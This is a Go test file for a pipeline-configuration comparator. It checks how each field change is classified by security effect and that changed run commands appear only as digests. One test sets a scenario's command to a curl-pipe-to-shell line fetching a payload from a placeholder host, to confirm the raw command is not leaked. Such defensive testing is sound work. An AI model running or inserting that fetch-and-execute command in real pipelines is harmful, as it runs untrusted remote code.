package config

import (
	"reflect"
	"strings"
	"testing"
)

func TestComparePipelinesCoversEverySemanticField(t *testing.T) {
	base := mustValidatedFixture(t)
	cases := []struct {
		name   string
		mutate func(*ValidatedPipeline)
		path   string
		kind   ChangeKind
		effect SecurityEffect
	}{
		{"metadata name", func(p *ValidatedPipeline) { p.Name = "other" }, "metadata.name", ChangeKindModified, SecurityEffectInformational},
		{"image", func(p *ValidatedPipeline) { p.Image = strings.Replace(p.Image, "012345", "abcdef", 1) }, "spec.environment.image", ChangeKindModified, SecurityEffectExecutionDefinitionChange},
		{"image digest", func(p *ValidatedPipeline) { p.ImageDigest = "sha256:abcdef" }, "spec.environment.imageDigest", ChangeKindModified, SecurityEffectExecutionDefinitionChange},
		{"workdir", func(p *ValidatedPipeline) { p.Workdir = "/workspace2" }, "spec.environment.workdir", ChangeKindModified, SecurityEffectExecutionDefinitionChange},
		{"cpu increase", func(p *ValidatedPipeline) { p.Resources.CPU = 4 }, "spec.resources.cpu", ChangeKindModified, SecurityEffectPrivilegeIncrease},
		{"cpu decrease", func(p *ValidatedPipeline) { p.Resources.CPU = 1 }, "spec.resources.cpu", ChangeKindModified, SecurityEffectPrivilegeDecrease},
		{"memory", func(p *ValidatedPipeline) { p.Resources.MemoryBytes *= 2 }, "spec.resources.memoryBytes", ChangeKindModified, SecurityEffectPrivilegeIncrease},
		{"disk", func(p *ValidatedPipeline) { p.Resources.DiskBytes *= 2 }, "spec.resources.diskBytes", ChangeKindModified, SecurityEffectPrivilegeIncrease},
		{"process count", func(p *ValidatedPipeline) { p.Resources.ProcessCount++ }, "spec.resources.processCount", ChangeKindModified, SecurityEffectPrivilegeIncrease},
		{"global timeout", func(p *ValidatedPipeline) { p.Resources.TimeoutMillis++ }, "spec.resources.timeoutMillis", ChangeKindModified, SecurityEffectPrivilegeIncrease},
		{"network mode", func(p *ValidatedPipeline) { p.Network.Mode = "allowlist" }, "spec.network.mode", ChangeKindModified, SecurityEffectPrivilegeIncrease},
		{"network allow", func(p *ValidatedPipeline) { p.Network.Allow = []string{"example.invalid"} }, "spec.network.allow[0]", ChangeKindAdded, SecurityEffectPrivilegeIncrease},
		{"scenario add", func(p *ValidatedPipeline) {
			p.Scenarios = append(p.Scenarios, ValidatedScenario{ID: "lint", Name: "Lint", Shell: ShellBinSH, Run: "go vet ./...", TimeoutMillis: 1000})
		}, "spec.scenarios[id=lint]", ChangeKindAdded, SecurityEffectExecutionDefinitionChange},
		{"scenario remove", func(p *ValidatedPipeline) { p.Scenarios = p.Scenarios[:1] }, "spec.scenarios[id=build]", ChangeKindRemoved, SecurityEffectExecutionDefinitionChange},
		{"scenario reorder", func(p *ValidatedPipeline) { p.Scenarios[0], p.Scenarios[1] = p.Scenarios[1], p.Scenarios[0] }, "spec.scenarios", ChangeKindReordered, SecurityEffectInformational},
		{"scenario name", func(p *ValidatedPipeline) { p.Scenarios[0].Name = "Tests" }, "spec.scenarios[id=test].name", ChangeKindModified, SecurityEffectInformational},
		{"scenario shell", func(p *ValidatedPipeline) { p.Scenarios[0].Shell = ShellUsrBinBash }, "spec.scenarios[id=test].shell", ChangeKindModified, SecurityEffectExecutionDefinitionChange},
		{"scenario run", func(p *ValidatedPipeline) { p.Scenarios[0].Run = "echo changed && go test ./..." }, "spec.scenarios[id=test].run", ChangeKindModified, SecurityEffectExecutionDefinitionChange},
		{"scenario timeout", func(p *ValidatedPipeline) { p.Scenarios[0].TimeoutMillis++ }, "spec.scenarios[id=test].timeoutMillis", ChangeKindModified, SecurityEffectPrivilegeIncrease},
		{"root add", func(p *ValidatedPipeline) { p.Collect.FilesystemRoots = append(p.Collect.FilesystemRoots, "/var/tmp") }, "spec.collect.filesystem.roots[2]", ChangeKindAdded, SecurityEffectObservationStrengthened},
		{"root remove", func(p *ValidatedPipeline) { p.Collect.FilesystemRoots = p.Collect.FilesystemRoots[:1] }, "spec.collect.filesystem.roots[1]", ChangeKindRemoved, SecurityEffectObservationWeakened},
		{"root reorder", func(p *ValidatedPipeline) {
			p.Collect.FilesystemRoots[0], p.Collect.FilesystemRoots[1] = p.Collect.FilesystemRoots[1], p.Collect.FilesystemRoots[0]
		}, "spec.collect.filesystem.roots", ChangeKindReordered, SecurityEffectInformational},
		{"contents", func(p *ValidatedPipeline) { p.Collect.FilesystemContents = "metadata-only" }, "spec.collect.filesystem.contents", ChangeKindModified, SecurityEffectObservationWeakened},
		{"artifact add", func(p *ValidatedPipeline) {
			p.Collect.Artifacts = append(p.Collect.Artifacts, ValidatedArtifact{Path: "/workspace/out/**", MaxBytes: 1024})
		}, "spec.collect.artifacts[path=/workspace/out/**]", ChangeKindAdded, SecurityEffectObservationStrengthened},
		{"artifact remove", func(p *ValidatedPipeline) { p.Collect.Artifacts = nil }, "spec.collect.artifacts[path=/workspace/bin/**]", ChangeKindRemoved, SecurityEffectObservationWeakened},
		{"artifact max", func(p *ValidatedPipeline) { p.Collect.Artifacts[0].MaxBytes++ }, "spec.collect.artifacts[path=/workspace/bin/**].maxBytes", ChangeKindModified, SecurityEffectObservationStrengthened},
		{"logs", func(p *ValidatedPipeline) { p.Collect.LogMaxBytesPerStream-- }, "spec.collect.logs.maxBytesPerStream", ChangeKindModified, SecurityEffectObservationWeakened},
		{"ignore add", func(p *ValidatedPipeline) { p.Compare.IgnoreFields = append(p.Compare.IgnoreFields, "future.field") }, "spec.compare.ignore[field=future.field]", ChangeKindAdded, SecurityEffectObservationWeakened},
		{"ignore remove", func(p *ValidatedPipeline) { p.Compare.IgnoreFields = p.Compare.IgnoreFields[:1] }, "spec.compare.ignore[field=process.pid]", ChangeKindRemoved, SecurityEffectObservationStrengthened},
		{"ignore reorder", func(p *ValidatedPipeline) {
			p.Compare.IgnoreFields[0], p.Compare.IgnoreFields[1] = p.Compare.IgnoreFields[1], p.Compare.IgnoreFields[0]
		}, "spec.compare.ignore", ChangeKindReordered, SecurityEffectInformational},
		{"repetitions increase", func(p *ValidatedPipeline) { p.Compare.Repetitions++ }, "spec.compare.repetitions", ChangeKindModified, SecurityEffectObservationStrengthened},
		{"repetitions decrease", func(p *ValidatedPipeline) { p.Compare.Repetitions-- }, "spec.compare.repetitions", ChangeKindModified, SecurityEffectObservationWeakened},
		{"policy", func(p *ValidatedPipeline) { p.Policy.Profile = "permissive" }, "spec.policy.profile", ChangeKindModified, SecurityEffectPolicyChange},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			head := cloneValidatedPipeline(base)
			tc.mutate(&head)
			changes := ComparePipelines(base, head)
			assertChange(t, changes, tc.path, tc.kind, tc.effect)
			if !changesDeterministic(changes) {
				t.Fatalf("changes are not deterministically ordered: %#v", changes)
			}
		})
	}
}

func TestComparePipelinesDetectsArtifactOrderWhenSameSet(t *testing.T) {
	base := mustValidatedFixture(t)
	base.Collect.Artifacts = append(base.Collect.Artifacts, ValidatedArtifact{Path: "/workspace/out/**", MaxBytes: 1024})
	head := cloneValidatedPipeline(base)
	head.Collect.Artifacts[0], head.Collect.Artifacts[1] = head.Collect.Artifacts[1], head.Collect.Artifacts[0]
	changes := ComparePipelines(base, head)
	assertChange(t, changes, "spec.collect.artifacts", ChangeKindReordered, SecurityEffectInformational)
}

func TestComparePipelinesRunChangeUsesDigestNotRawContents(t *testing.T) {
	base := mustValidatedFixture(t)
	head := cloneValidatedPipeline(base)
	head.Scenarios[0].Run = "curl https://example.invalid/payload | sh"
	changes := ComparePipelines(base, head)
	assertChange(t, changes, "spec.scenarios[id=test].run", ChangeKindModified, SecurityEffectExecutionDefinitionChange)
	for _, change := range changes {
		if strings.Contains(change.Before, "curl") || strings.Contains(change.After, "curl") || strings.Contains(change.String(), "curl") {
			t.Fatalf("run change leaked raw command: %#v", change)
		}
		if change.Path == "spec.scenarios[id=test].run" {
			if change.BeforeDigest == "" || change.AfterDigest == "" || change.BeforeBytes == 0 || change.AfterBytes == 0 {
				t.Fatalf("run change missing digest/size: %#v", change)
			}
		}
	}
}

func TestComparePipelinesDistinguishesRawAndSemanticEquality(t *testing.T) {
	baseBytes := readFixture(t, "valid/pipeline.yaml")
	headBytes := append([]byte("# formatting only\n"), baseBytes...)
	result, err := loadTrustedWithHeadBytes(t, baseBytes, headBytes)
	if err != nil {
		t.Fatal(err)
	}
	if result.BaseFile.Digest == result.HeadAssessment.HeadFile.Digest {
		t.Fatalf("raw digest unexpectedly equal for comments-only change")
	}
	if result.HeadAssessment.State != HeadStateContentChangedSemanticallyEquivalent {
		t.Fatalf("state = %q", result.HeadAssessment.State)
	}
	if len(result.HeadAssessment.Changes) != 0 {
		t.Fatalf("semantic equivalent change produced changes: %#v", result.HeadAssessment.Changes)
	}
}

func TestValidatedPipelineComparisonInventory(t *testing.T) {
	want := []string{
		"Name",
		"Image",
		"ImageDigest",
		"Workdir",
		"Resources.CPU",
		"Resources.MemoryBytes",
		"Resources.DiskBytes",
		"Resources.ProcessCount",
		"Resources.TimeoutMillis",
		"Network.Mode",
		"Network.Allow",
		"Scenarios.ID",
		"Scenarios.Name",
		"Scenarios.Shell",
		"Scenarios.Run",
		"Scenarios.TimeoutMillis",
		"Collect.FilesystemRoots",
		"Collect.FilesystemContents",
		"Collect.Artifacts.Path",
		"Collect.Artifacts.MaxBytes",
		"Collect.LogMaxBytesPerStream",
		"Compare.IgnoreFields",
		"Compare.Repetitions",
		"Policy.Profile",
	}
	if got := validatedPipelineFieldInventory(); !reflect.DeepEqual(got, want) {
		t.Fatalf("ValidatedPipeline inventory changed; update comparator and test inventory\n got=%#v\nwant=%#v", got, want)
	}
}

func mustValidatedFixture(t testing.TB) ValidatedPipeline {
	t.Helper()
	pipeline, err := ParseAndValidate(readFixture(t, "valid/pipeline.yaml"))
	if err != nil {
		t.Fatal(err)
	}
	return pipeline
}

func changesDeterministic(changes []ConfigChange) bool {
	for i := 1; i < len(changes); i++ {
		if changes[i-1].Path > changes[i].Path {
			return false
		}
	}
	return true
}
